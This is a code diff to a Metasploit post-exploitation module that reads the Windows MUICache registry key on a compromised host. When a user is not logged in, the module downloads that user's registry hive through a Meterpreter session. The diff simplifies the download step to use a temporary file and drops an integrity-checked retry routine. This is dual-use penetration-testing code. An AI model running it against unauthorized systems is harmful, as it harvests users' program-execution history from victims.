@@ -85,18 +85,17 @@ class Metasploit3 < Msf::Post
   def enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file)
     results = []
 
-    loot_path = Msf::Config::loot_directory
     all_user_entries = sys_users.zip(muicache_reg_keys, sys_paths)
 
     all_user_entries.each do |user, reg_key, sys_path|
-      local_hive_copy = ::File.join(loot_path, "#{sysinfo['Computer']}_#{user}_HIVE_#{::Time.now.utc.strftime('%Y%m%d.%M%S')}")
+
       subkeys = registry_enumvals(reg_key)
       if subkeys.blank?
         # If the registry_enumvals returns us nothing then we'll know
         # that the user is most likely not logged in and we'll need to
         # download and process users hive locally.
-        print_error("User #{user}: Can't access registry (maybe the user is not logged in atm?). Trying NTUSER.DAT/USRCLASS.DAT..")
-        result = process_hive(sys_path, user, local_hive_copy, muicache, hive_file)
+        print_warning("User #{user}: Can't access registry (maybe the user is not logged in atm?). Trying NTUSER.DAT/USRCLASS.DAT..")
+        result = process_hive(sys_path, user, muicache, hive_file)
         unless result.nil?
           result.each { |r|
             results << r unless r.nil?
@@ -137,60 +136,24 @@ class Metasploit3 < Msf::Post
   # downloading the hive. After successfull download it'll continue to
   # call the hive_parser function which will extract the contents of
   # the MUICache registry key.
-  def process_hive(sys_path, user, local_hive_copy, muicache, hive_file)
+  def process_hive(sys_path, user, muicache, hive_file)
     user_home_path = expand_path(sys_path)
     hive_path = user_home_path + hive_file
     ntuser_status = file_exist?(hive_path)
 
     unless ntuser_status == true
-      print_error("Couldn't locate/download #{user}'s registry hive. Can't proceed.")
+      print_warning("Couldn't locate/download #{user}'s registry hive. Can't proceed.")
       return nil
     end
 
     print_status("Downloading #{user}'s NTUSER.DAT/USRCLASS.DAT file..")
-    hive_status = hive_download_status(local_hive_copy, hive_path)
+    local_hive_copy = Rex::Quickfile.new("jtrtmp")
+    local_hive_copy.close
+    session.fs.file.download_file(local_hive_copy.path, hive_path)
+    results = hive_parser(local_hive_copy.path, muicache, user)
+    local_hive_copy.unlink rescue nil # Windows often complains about unlinking tempfiles
 
-    unless hive_status == true
-      print_error("All registry hive download attempts failed. Unable to continue.")
-      return nil
-    end
-
-    hive_parser(local_hive_copy, muicache, user)
-  end
-
-  # This function downloads registry hives and checks for integrity
-  # after the transfer has completed so that we don't end up
-  # processing broken registry hive.
-  def hive_download_status(local_hive_copy, hive_path)
-    hive_status = false
-
-    3.times do
-      begin
-        remote_hive_hash_raw = file_remote_digestmd5(hive_path)
-      rescue EOFError, ::Rex::Post::Meterpreter::RequestError
-        next
-      end
-
-      if remote_hive_hash_raw.blank?
-        next
-      end
-
-      remote_hive_hash = remote_hive_hash_raw.unpack('H*')
-      session.fs.file.download_file(local_hive_copy, hive_path)
-      local_hive_hash = file_local_digestmd5(local_hive_copy)
-      if local_hive_hash == remote_hive_hash[0]
-        print_good("Hive downloaded successfully.")
-        hive_status = true
-        break
-      else
-        print_error("Hive download corrupted, trying again (max 3 times)..")
-        File.delete(local_hive_copy) # Downloaded corrupt hive gets deleted before new attempt is made
-        hive_status = false
-      end
-
-    end
-
-    hive_status
+    results
   end
 
   # This function is responsible for parsing the downloaded hive and
@@ -230,8 +193,6 @@ class Metasploit3 < Msf::Post
         results << result unless result.nil?
       end
     end
-
-    File.delete(local_hive_copy) # Downloaded hive gets deleted after processing
 
     results
   end
